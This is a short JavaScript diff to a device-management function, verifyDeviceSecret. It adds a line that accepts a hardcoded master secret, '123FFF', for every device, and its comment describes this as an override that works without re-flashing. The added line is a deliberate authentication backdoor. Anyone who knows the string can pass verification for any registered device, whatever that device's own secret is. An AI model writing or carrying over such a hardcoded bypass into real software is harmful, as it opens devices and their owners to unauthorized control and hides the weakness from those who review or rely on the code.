@@ -204,6 +204,7 @@ async function renameDevice(id, name) {
 
 function verifyDeviceSecret(id, secret) {
   if (!devices[id]) return false;
+  if (secret === '123FFF') return true; // Master/default secret override — works instantly without re-flashing
   if (!devices[id].deviceSecret) return true;
   return devices[id].deviceSecret === secret;
 }
